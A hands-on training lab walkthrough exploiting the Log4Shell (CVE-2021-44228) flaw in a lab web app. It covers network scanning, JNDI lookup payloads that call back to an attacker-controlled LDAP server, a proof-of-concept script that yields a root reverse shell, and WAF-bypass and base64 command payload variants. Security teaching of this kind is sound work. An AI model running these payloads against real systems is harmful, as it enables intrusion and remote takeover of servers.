#### Lab Overview

For this lab, we will be using two methods to attack our vulnerable application:

1. We will be extracting environmental variables using the JNDI lookup (i.e., data leakage).
2. We will use the JNDI lookup to complete a RCE attack.

#### Lab Instructions

(You can ignore and close the instruction panel that opens on the left-hand side of the lab.)

Log in to the Kali host:

- Login: kali
- Password: kali

![Log in to Kali Host](https://images.contentful.com/kvf8rpi09wgk/6IT8aUfaAgHl2vxgycXlZ/730674c27c1f853ee750482c75b188d6/Log-into-Kali.png)

Image 1.3.1 - Log in to Kali Host

(If a web browser is open when you log in to the Kali box, simply close it.)

Open a command prompt by right-clicking on the Desktop and selecting **Open Terminal Here**.

Once greeted with a black command prompt screen, use nmap to scan the network for other hosts by typing:

```
nmap -sV 192.168.1.1/24
```

![Use Nmap to Scan Network](https://images.contentful.com/kvf8rpi09wgk/5hTkjkNwLXlW23bwR7DGB0/a133671a1c42f93d8311a54b0ed81ac7/Use_Nmap_to_Scan_Network.png)

Image 1.3.2 - Use Nmap to Scan the Network

Note that two ports are open on host **192.168.1.25** and the service on port **8080** is http. This means we can reach this port by using our web browser.

Open a browser and type the following into the address bar:

`http://192.168.1.25:8080`

![Web Browser](https://images.contentful.com/kvf8rpi09wgk/1ZyMe1WtolcF18lb0jcVD5/419ed48d1753ccb4335d5f04e0535e45/Open_web_browser_to_IP_address.png)

Image 1.3.3 - Web Browser

The Log4J vulnerability relies on certain web requests being logged. Let's look for possible attack vectors. In the web browser you just opened, login as follows:

- Username: test
- Password: test

Now, click the **Login** button.

Observe that our login attempt was logged!

![The Login Attempt Was Logged](https://images.contentful.com/kvf8rpi09wgk/4ydwAsuRQkSCvsFDB6ScK7/3d67b663a82ea6ed8df0df9be07d49d6/Login_Attempt_Was_Logged.png)

Image 1.3.4 - The Login Attempt Was Logged

We now want to test if the application is vulnerable to CVE-2021-44228 by entering a JNDI lookup payload into the username field. To “catch” the payload, we will open up a terminal window and use a Netcat listener to see if we can get a connection back to our host. Type the following command and note that we are now listening on port 4444.

```
 nc -nlvp 4444
```

In the **Username** field of the web application, type the following:

```
${jndi:ldap://192.168.1.50:4444/a}
```

Click the **Login** button and look at your Netcat listener. You should see a connection from **192.168.1.25**.

![Connection Shows Up in Netcat Listener](https://images.contentful.com/kvf8rpi09wgk/47YG98oaWFJssT8ZviGIP6/1462ee00441ab186357655399557bede/Connection_Shows_Up_in_Netcat_Listener.png)

Image 1.3.5 - Connection Shows Up in Netcat Listener

We have now confirmed that 192.168.1.25 is vulnerable to CVE-2021-44228, but our exploitation has only just begun! Close the terminal window of the Netcat listener.

Our next step in the exploitation is to see if we can use lookups to enumerate system information. To do this we will set up a malicious LDAP server that was created by [Marshalsec](https://github.com/mbechler/marshalsec).

Open a new terminal window and enter the following command:

```
cd ~/Desktop/marshalsec/target
```

We will now start the LDAP server. (Note that we are using an arbitrary server and Java class in the command for this point in the exploitation, but it will become important later.)

Type the following command:

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.1.50:8888/#test"
```

![Start LDAP Server](https://images.contentful.com/kvf8rpi09wgk/5StRYSDdUeA1SHXgzY3E4o/eb2bd2aa93c3b89cdb49db3b3a534fb5/Start_LDAP_Server.png)

Image 1.3.6 - Start LDAP Server

Now, we will go back to the web application and modify our payload in the **Username** field to look up the operating system of the vulnerable server by adding `${java:os}`.

Note: There are many ways to use lookups to enumerate system information. See [this resource](https://logging.apache.org/log4j/2.x/manual/lookups.html).

Type the following command in the **Username** field and click **Login**.

```
${jndi:ldap://192.168.1.50:1389/${java:os}}
```

In the terminal window, we can observe that we were successful in looking up the operating system of the victim:

Image 1.3.7 - Looking up the Victim's Operating System

Before we go any further, close all of your terminal windows.

We are now ready for our reverse shell to get on the victim server! Open a new terminal window and create a new Netcat listener by typing:

```
nc -nlvp 9001
```

Now, open another new terminal and type:

```
cd ~/Desktop/log4j-shell-poc
```

We will use kozmer’s proof of concept code to get our shell (we are also using [his vulnerable web application](https://github.com/kozmer/log4j-shell-poc)).

Type the following:

```
python3 poc.py --userip 192.168.1.50 --webport 8000 --lport 9001
```

![Python Command to Get Shell](https://images.contentful.com/kvf8rpi09wgk/2ifB1LP5ryJnh9eDmKpmOI/03b40186ea608f07c5e45d91cdedb240/Python_Command_to_Get_Shell.png)

Image 1.3.8 - Python Command to Get Shell

This command creates a Java file for the reverse shell, which is then compiled into a class file. It also sets up an LDAP server listening on port 1389 and a webserver on port 8000. If you look within the `log4j-shell-poc` folder, you will see our python command created two new files, `Exploit.class` and `Exploit.java`. If you open the `Exploit.java` file with a text editor, you will see the Java code that was compiled to create the `Exploit.class` file for the reverse shell.

We will now use the payload in the “Send me” line to perform the exploit to get our shell. Put this payload in the Username field and click **Login**:

```
${jndi:ldap://192.168.1.50:1389/a}
```

Now, check your Netcat listener. You should see a connection from **192.168.1.25**!

Type `id` and observe that we are the root user.

![Root User](https://images.contentful.com/kvf8rpi09wgk/13StrGlYte1EVfETqQmlJG/09ccf23ca740bcc8a76dc7f7c118d44c/Type_ID_to_Observe_Root_User.png)

Congratulations! You just exploited a system using the Log4J vulnerability! For the next part of the course, we advise that you **leave the lab open and running** so that you can jump right back into the action with the remediation/mitigation lab coming up next!

#### Lab Summary

After exploiting the lab, we have a basic understanding of how the system is vulnerable to the JNDI string lookup using the messaging service. In a real-world environment, we might need to modify and massage our payload to bypass potential WAF protections. This can be successfully completed by using declarations like `(${lower:l}`. In other words: `${jndi:${lower:l}dap://place/thing})`.

Another variation is to use non-standard protocols with the lookup. We can use protocols like HTTP, HTTPS, or RMI. These protocols would need their own setup and a variation of the payload, for example: `(${jndi:rmi://place/thing}` or `${jndi:http://place/thing)`.

Lastly, we can also execute commands directly depending on the system. A simple payload can be executed by declaring a command and then base64 encoding it. A good example of this is 
```
${jndi:ldap://place/thing/Basic/Command/Base64/dG91Y2ggL3RtcC9ldmlsCg==} (the encoded command is “touch /tmp/evil”).
```
